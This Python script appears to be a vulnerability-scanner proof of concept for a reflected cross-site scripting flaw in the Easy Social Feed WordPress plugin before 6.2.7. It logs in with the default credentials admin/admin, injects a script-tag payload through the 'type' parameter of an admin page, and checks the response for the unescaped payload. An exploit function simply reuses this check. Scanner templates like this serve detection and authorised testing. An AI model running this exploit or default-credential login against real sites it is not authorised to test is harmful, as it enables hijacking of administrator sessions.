import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Easy Social Feed < 6.2.7 - Reflected Cross-Site Scripting (XSS)''',
        "description": '''The plugin does not sanitise and escape a parameter before outputting back in an admin dashboard page, leading to a reflected Cross-Site Scripting issue which will be executed in the context of a logged admin or editor.''',
        "severity": "medium",
        "references": [
            "https://wpscan.com/vulnerability/6dd00198-ef9b-4913-9494-e08a95e7f9a0"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["wordpress", "wp-plugin", "xss", "authenticated"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    username = "admin"
    password = "admin"
    try:
        url = format_url(url)

        s = requests.Session()

        path = """/wp-login.php"""
        method = "POST"
        data = """log={username}&pwd={password}&wp-submit=Log+In&testcookie=1""".format(username=username, password=password)
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': 'wordpress_test_cookie=WP%20Cookie%20check'}
        resp0 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/wp-admin/admin.php?page=easy-facebook-likebox&access_token=a&type=</script><script>alert(document.domain)</script>"""
        method = "GET"
        data = """"""
        headers = {}
        resp1 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""'type' : '</script><script>alert(document.domain)</script>'""" in resp1.text) and ("""text/html""" in str(resp1.headers)) and (resp1.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url